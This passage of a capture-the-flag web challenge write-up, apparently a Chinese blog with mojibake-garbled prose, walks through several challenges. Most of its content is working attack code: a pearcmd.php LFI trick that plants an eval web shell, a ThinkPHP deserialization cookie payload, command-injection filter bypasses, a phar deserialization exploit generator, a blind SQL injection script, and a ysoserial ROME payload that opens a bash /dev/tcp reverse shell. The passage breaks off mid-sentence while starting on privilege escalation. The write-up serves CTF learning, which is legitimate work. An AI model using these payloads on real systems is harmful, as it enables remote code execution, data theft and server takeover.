alt="image-20221020163917173"></p><p>å›æ»š<code>git reset --hard commit_id</code>åï¼Œè¯»å–flag.txtå¾—åˆ°<code>flag&#123;Yesec#1s#c@ibi&#125;</code></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>æºç æ³„éœ²</p><ol><li><p>gitå›æ»š</p><p>æŸ¥çœ‹å†å²ç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure><p>å›æ»šåˆ°å†å²ç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure><blockquote><p>å®é™…ä¸Šå°±æ˜¯å°†HEADæŒ‡å‘commit_id</p></blockquote></li><li><p>gitç¼“å­˜</p><p>å°†å½“å‰å·¥ä½œåŒºç¼“å­˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash</span><br></pre></td></tr></table></figure><p>æ¢å¤ç¼“å­˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash pop</span><br></pre></td></tr></table></figure><p>å›æ»šåˆ°ç¼“å­˜ç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure></li></ol><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h3><h4 id="ezapi"><a href="#ezapi" class="headerlink" title="ezapi"></a>ezapi</h4><p>graphql</p><p>æ¼æ´ï¼š<a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ</a></p><p>ä½¿ç”¨è¯­æ³•ï¼š<a href="https://blog.csdn.net/weixin_39130261/article/details/118547853">https://blog.csdn.net/weixin_39130261/article/details/118547853</a></p><h3 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h3><h4 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//Can you get shell? RCE via LFI if you get some trick,this question will be so easy!</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base64|rot13|filter/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰ç»•è¿‡åç¼€åæ·»åŠ ï¼Œä½¿ç”¨pearcmd.phpç»•è¿‡ã€‚</p><p>pç¥çš„æ–‡ç« ï¼š<a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></p><blockquote><p>peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚(ç±»ä¼¼äºpythonä¸­çš„pip)åœ¨7.3åŠä»¥å‰ï¼Œpecl&#x2F;pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š<code>--with-pear</code>æ‰ä¼šå®‰è£…ã€‚</p><p>ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel&#x2F;pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨<code>/usr/local/lib/php</code></p><p>pearä¸­æœ‰ä¸€ä¸ªå‘½ä»¤config-createï¼Œé˜…è¯»å…¶ä»£ç å’Œå¸®åŠ©ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</p></blockquote><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure><p>ç„¶åä¸€å¥è¯æœ¨é©¬å°±ä¼šè¢«å†™å…¥&#x2F;tmp&#x2F;hello.phpä¸­ï¼Œæˆ‘ä»¬åªéœ€åŒ…å«è¿™ä¸ªæ–‡ä»¶å³å¯ã€‚</p><h4 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h4><p>5.1.41LTS ThinkPHPæ¡†æ¶ååºåˆ—åŒ–æ¼æ´<a href="https://www.freebuf.com/vuls/269882.html">https://www.freebuf.com/vuls/269882.html</a></p><p>è¿™é“é¢˜ååºåˆ—åŒ–ç‚¹åœ¨cookieä¸­</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cookie:</span><br><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&amp;id=whoami</span><br><span class="line">    </span><br><span class="line">?dajs=ls</span><br></pre></td></tr></table></figure><p>flagåœ¨ç¯å¢ƒå˜é‡é‡Œã€‚</p><h3 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h3><h4 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å¾ˆå¤šã€‚ä¸»è¦æ˜¯</p><ul><li><p>å…³é”®è¯ç»•è¿‡</p><p>é€šé…ç¬¦ï¼Œæ’å…¥ç©ºå­—ç¬¦ç»•è¿‡ç­‰ç­‰</p></li><li><p>ï¼›ç»•è¿‡</p><p>%0aæˆ–è€…&amp;&amp;ç»•è¿‡</p></li><li><p>&#x2F;ç»•è¿‡</p><p><code>ls /</code> &#x3D;&#x3D; <code>cd è·¯å¾„ï¼›ls</code></p><p>è¿”å›ä¸Šçº§ç›®å½• <code>cd ..</code></p></li><li><p>ç©ºæ ¼ç»•è¿‡</p><p><code>$&#123;IFS&#125;</code>ç­‰ç­‰</p></li></ul><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?cmd=cd$&#123;IFS&#125;..%<span class="number">0</span>acd$&#123;IFS&#125;..%<span class="number">0</span>acd$&#123;IFS&#125;..%<span class="number">0</span>aca$<span class="number">1</span>t$&#123;IFS&#125;ffff$<span class="number">1</span>llllaaaaggggg</span><br></pre></td></tr></table></figure><h4 id="BabySSTI-Two"><a href="#BabySSTI-Two" class="headerlink" title="BabySSTI_Two"></a>BabySSTI_Two</h4><p>unicodeç¼–ç ç»•è¿‡ï¼Œcatch_warningsè¢«è¿‡æ»¤ï¼Œæ¢ä¸€ä¸ªç±»æ¯”å¦‚os._wrap_closeå°±å¥½äº†ã€‚</p><h4 id="UnserializeThree"><a href="#UnserializeThree" class="headerlink" title="UnserializeThree"></a>UnserializeThree</h4><p>è€ƒç‚¹ï¼špharååºåˆ—åŒ–ï¼Œ#ç»•è¿‡</p><p>æ–‡ä»¶ä¸Šä¼ ç»™å‡ºä¸Šä¼ åæ–‡ä»¶è·¯å¾„</p><p>æ³¨é‡Šä¸­æç¤ºclass.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            <span class="comment">//Same point ,can you bypass me again?</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>#ç»•è¿‡</p><ol><li>é—­åˆphpæ ‡ç­¾</li><li>\n</li><li>\r</li></ol><p>è¿™é‡Œåªèƒ½ç”¨\rã€‚</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;\rsystem(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">                <span class="comment">//Same point ,can you bypass me again?</span></span><br><span class="line">                <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//ç”Ÿæˆçš„å‹ç¼©æ–‡ä»¶åä¸ºtest.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„pharæ”¹å›¾ç‰‡åç¼€åä¸Šä¼ åï¼Œåœ¨class.phpä¸‹ç”¨pharåè®®è®¿é—®ï¼ˆåªè¦æ˜¯pharæ–‡ä»¶ï¼Œåç¼€åæ˜¯ä»€ä¹ˆéƒ½å¯ä»¥è§£æï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">class</span>.php?file=phar:<span class="comment">//file_path</span></span><br></pre></td></tr></table></figure><h4 id="åˆä¸€ä¸ªSQL"><a href="#åˆä¸€ä¸ªSQL" class="headerlink" title="åˆä¸€ä¸ªSQL"></a>åˆä¸€ä¸ªSQL</h4><p>0^0å’Œ0^1ï¼Œå›æ˜¾ä¸¤ç§æƒ…å†µï¼ŒçŒœæµ‹ä½¿ç”¨ç›²æ³¨ã€‚</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ•°å­—</span></span><br><span class="line"><span class="comment">#0^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)</span></span><br><span class="line"><span class="comment">#å•å¼•å·</span></span><br><span class="line"><span class="comment">#0&#x27; or (ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://afe4417f-e94a-484b-bd96-f8a0e17414a5.node4.buuoj.cn:81/comments.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://14a849d8-1ab5-4d00-a4d6-62d9671f66b0.node4.buuoj.cn:81/comments.php?name=c&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SqlBlind</span>():</span><br><span class="line"></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid=(left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line"><span class="comment">#wfy_admin,wfy_comments,wfy_information</span></span><br><span class="line"><span class="comment">#where(user=&#x27;f1ag_is_here&#x27;)</span></span><br><span class="line">            params=&#123;</span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;c&quot;,</span></span><br><span class="line">                <span class="comment"># &#x27;comment&#x27;:&quot;hack&quot;,</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;wfy_information&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                 <span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;0^(ord(substr((select(group_concat(text))from(wfy_comments)where(user=&#x27;f1ag_is_here&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid),</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¯·æ±‚æ–¹å¼</span></span><br><span class="line">            <span class="comment">#r=requests.get(url=url,params=params)</span></span><br><span class="line">            r=requests.post(url=url,data=params)</span><br><span class="line">            <span class="comment">#print(r.text)</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># é˜²æ­¢429</span></span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#r=requests.get(url=url2)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># ç¼–ç </span></span><br><span class="line">            <span class="comment">#r=str(r.json())</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment"># Trueçš„æ ‡å¿—  0çš„ä¸ªæ•°</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;å¥½è€¶&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># if r.text.count(&#x27;0&#x27;)==i:</span></span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line"></span><br><span class="line">            mid=(left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left &lt;=<span class="number">32</span> <span class="keyword">or</span> right &gt;= <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>,result)</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    SqlBlind()</span><br></pre></td></tr></table></figure><h4 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/*    */</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerController</span></span><br><span class="line"><span class="comment">/*    */</span> &#123;</span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="keyword">public</span> String <span class="title function_">helloCTF</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">/* 19 */</span>     <span class="keyword">return</span> <span class="string">&quot;Do you like Jvav?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@PostMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="keyword">public</span> String <span class="title function_">helloCTF</span><span class="params">(<span class="meta">@RequestParam</span> String EXP)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="comment">/* 24 */</span>     <span class="keyword">if</span> (EXP.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">/* 25 */</span>       <span class="keyword">return</span> <span class="string">&quot;Do you know Rome Serializer?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>     &#125;</span><br><span class="line"><span class="comment">/* 27 */</span>     <span class="type">byte</span>[] exp = Base64.getDecoder().decode(EXP);</span><br><span class="line"><span class="comment">/* 28 */</span>     <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line"><span class="comment">/* 29 */</span>     <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line"><span class="comment">/* 30 */</span>     objectInputStream.readObject();</span><br><span class="line"><span class="comment">/* 31 */</span>     <span class="keyword">return</span> <span class="string">&quot;Do You like Jvav?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br><span class="line"><span class="comment">/*    */</span> &#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–ç‚¹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure><p>ROMEååºåˆ—åŒ–åˆ†æ</p><p><a href="https://www.yulate.com/292.html">https://www.yulate.com/292.html</a></p><blockquote><p>javaç‰ˆæœ¬è¦jdk8u-121ç…§ç€æ–‡ç« æœ¬åœ°å¤ç°äº†ï¼Œä½†æ˜¯ç”¨ysoserialå†™äº†åå¼¹shellï¼Œé¢˜ç›®çš„å‘é€è¿‡å»ä¸å¯ä»¥</p></blockquote><p>è¿™å‘¨å‘ç°åªè¦æŠŠpayloadæ‹¿å»urlç¼–ç åå°±å¯ä»¥äº†ã€‚</p><p>è¿™é‡Œæ€è€ƒäº†å¾—å‡ºçš„ç»“æœæ˜¯</p><blockquote><p>RFC3986ä¸­æŒ‡å®šäº†ä»¥ä¸‹å­—ç¬¦ä¸ºä¿ç•™å­—ç¬¦ï¼š! * â€˜ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ]</p><p>ã€€ã€€ä¸å®‰å…¨å­—ç¬¦ï¼šè¿˜æœ‰ä¸€äº›å­—ç¬¦ï¼Œå½“ä»–ä»¬ç›´æ¥æ”¾åœ¨URLä¸­çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå¼•èµ·è§£æç¨‹åºçš„æ­§ä¹‰ã€‚è¿™äº›å­—ç¬¦è¢«è§†ä¸ºä¸å®‰å…¨å­—ç¬¦ï¼ŒåŸå› æœ‰å¾ˆå¤šã€‚</p><ul><li>ç©ºæ ¼ï¼šUrl åœ¨ä¼ è¾“çš„è¿‡ç¨‹ï¼Œæˆ–è€…ç”¨æˆ·åœ¨æ’ç‰ˆçš„è¿‡ç¨‹ï¼Œæˆ–è€…æ–‡æœ¬å¤„ç†ç¨‹åºåœ¨å¤„ç†Urlçš„è¿‡ç¨‹ï¼Œéƒ½æœ‰å¯èƒ½å¼•å…¥æ— å…³ç´§è¦çš„ç©ºæ ¼ï¼Œæˆ–è€…å°†é‚£äº›æœ‰æ„ä¹‰çš„ç©ºæ ¼ç»™å»æ‰ã€‚</li><li>å¼•å·ä»¥åŠ&lt;&gt;ï¼šå¼•å·å’Œå°–æ‹¬å·é€šå¸¸ç”¨äºåœ¨æ™®é€šæ–‡æœ¬ä¸­èµ·åˆ°åˆ†éš”Urlçš„ä½œç”¨</li><li>#ï¼šé€šå¸¸ç”¨äºè¡¨ç¤ºä¹¦ç­¾æˆ–è€…é”šç‚¹</li><li>%ï¼šç™¾åˆ†å·æœ¬èº«ç”¨ä½œå¯¹ä¸å®‰å…¨å­—ç¬¦è¿›è¡Œç¼–ç æ—¶ä½¿ç”¨çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå› æ­¤æœ¬èº«éœ€è¦ç¼–ç </li><li>{}|^[]&#96;~ï¼šæŸä¸€äº›ç½‘å…³æˆ–è€…ä¼ è¾“ä»£ç†ä¼šç¯¡æ”¹è¿™äº›å­—ç¬¦</li></ul></blockquote><p>è€Œbase64åŠ å¯†åå¯èƒ½ä¼šå‡ºç°<code>+,/,=</code></p><p>è§£é¢˜æ­¥éª¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME &quot;bash -c &#123;echo,xxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><p>xxxä¸ºbase64åçš„<code>bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1</code></p><p>è¿™é‡Œ<code>&gt; 1.txt</code>æ˜¯å› ä¸ºå¦‚æœæˆ‘åŠ äº†<code>|base64</code>ç”Ÿæˆäº†ä¹‹åä¼šå‡ºç°å…¶ä»–ç¬¦å·</p><p><img src="/../images/image-20221018174601257-1686150281426.png" alt="image-20221018174601257"></p><p>ç”¨pythonæˆ–è€…cyberchefæ¥base64åŠ å¯†</p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXP=å¯¹ä¸Šé¢ç”Ÿæˆçš„base64å†è¿›è¡Œurlç¼–ç </span><br></pre></td></tr></table></figure><p>è¿æ¥åflagåœ¨æ ¹ç›®å½•</p><p><img src="/../images/image-20221018174256886-1686150281426.png" alt="image-20221018174256886"></p><h3 id="week-5"><a href="#week-5" class="headerlink" title="week 5"></a>week 5</h3><h4 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h4><p>ç›´æ¥åˆ©ç”¨<code>&gt;</code>å†™å…¥æœ¨é©¬ï¼Œç„¶åä¸€å¼€å§‹ä½¿ç”¨èšå‰‘è¿æ¥</p><p>è¯»å–æ ¹ç›®å½•ä¸‹çš„start.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo $FLAG &gt; /ffll444aaggg &amp;&amp; export FLAG=not &amp;&amp; FLAG=not &amp;&amp; chmod 700 /ffll444aaggg &amp;&amp; \</span><br><span class="line">service apache2 restart &amp;&amp; \</span><br><span class="line">tail -f /dev/null</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>chmod 700 /ffll444aaggg</code>çš„æ„æ€å°±æ˜¯&#x2F;ffll444aagggåªæœ‰rootç”¨æˆ·å¯ä»¥è®¿é—®ã€‚</p><p>ç„¶åç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å°±æ˜¯ç”¨suidææƒï¼Œå› 